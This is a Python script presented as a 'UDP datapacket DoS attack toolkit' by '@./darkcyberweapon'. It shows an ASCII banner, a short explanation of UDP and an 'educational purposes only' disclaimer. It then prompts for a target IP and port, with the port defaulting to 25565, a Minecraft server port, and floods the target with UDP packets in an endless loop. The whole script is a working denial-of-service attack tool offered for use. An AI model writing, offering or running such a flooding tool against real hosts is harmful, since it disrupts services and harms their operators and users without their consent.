import socket
import os
os.system("clear")
R = '\033[91m \033[01m'
G = '\033[92m \033[01m'
B = '\033[94m \033[01m'
C = '\033[36m \033[01m'
N = '\033[0m \033[01m'

logo = """
█░█ █▀ █▀▀ █▀█   █▀▄ ▄▀█ ▀█▀ ▄▀█ █▀▀ █▀█ ▄▀█ █▀▄▀█   █▀█ █▀█ █▀█ ▀█▀ █▀█ █▀▀ █▀█ █░░   █▀▄ █▀█ █▀   ▄▀█ ▀█▀ ▀█▀ ▄▀█ █▀▀ █▄▀
█▄█ ▄█ ██▄ █▀▄   █▄▀ █▀█ ░█░ █▀█ █▄█ █▀▄ █▀█ █░▀░█   █▀▀ █▀▄ █▄█ ░█░ █▄█ █▄▄ █▄█ █▄▄   █▄▀ █▄█ ▄█   █▀█ ░█░ ░█░ █▀█ █▄▄ █░█

▀█▀ █▀█ █▀█ █░░ █▄▀ █ ▀█▀
░█░ █▄█ █▄█ █▄▄ █░█ █ ░█░                                        ✪ TOOL BY @./darkcyberweapon ✪"""  

print(f"{C}{logo}{N}")
print("")
about ="""☠Σ UDP stands for User Datagram Protocol. It is a simple transport layer protocol in the Internet protocol suite that operates on top of the Internet Protocol (IP).

☠Σ UDP is a connectionless protocol, which means that there is no handshake or setup phase to establish a connection before transmitting data. Instead, UDP packets, also called datagrams, are sent directly to the recipient without any prior negotiation.

☠Σ UDP provides a fast and lightweight method of transmitting data over the network, but it does not guarantee delivery or order of packets. UDP packets are not guaranteed to arrive at their destination, and they may arrive out of order. Additionally, UDP does not provide any error checking or correction mechanisms, so packets that are lost or corrupted during transmission will not be retransmitted or corrected.

☠Σ Because of its speed and simplicity, UDP is often used for real-time applications such as online gaming, voice and video conferencing, and streaming media. These applications prioritize speed and responsiveness over data reliability, so the occasional lost or out-of-order packet is acceptable.

☠Σ In summary, UDP is a simple transport layer protocol that provides a fast and lightweight method of transmitting data over the network, but sacrifices reliability in exchange for speed and simplicity."""
print(" ")
print(f"{G}{about}{N}")
print("")
print(f"{R}[❅]  Warning !!! This script was not a joke.")
print(f"{R}[❅]  It is for educational purposes only, Developer is not responsible for any damage caused by the this project")
print(f"{R}[❅]  To insert the default port is 0{N}")
print(C)
ip = input("☯ Enter Target ip:> ")
print("")
port = int(input("☯ Enter Target port number:> "))

#for i in range(10):
#    print(i)

print("")
print("[+]☯ UNLIMITED UDP DATAPACKET ATTACK STARTED SUCCESSFULLY ☯[+]")
print("")

if port == 0:
    port = 25565

packet_count = 0  # initialize packet counter

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, port))
    s.send(b'\x01')
    packet_count += 1  # increment packet counter
    print(f"[+] Sent {packet_count} packets to {ip}:{port}")
#print("DARK CYBER WEAPON")
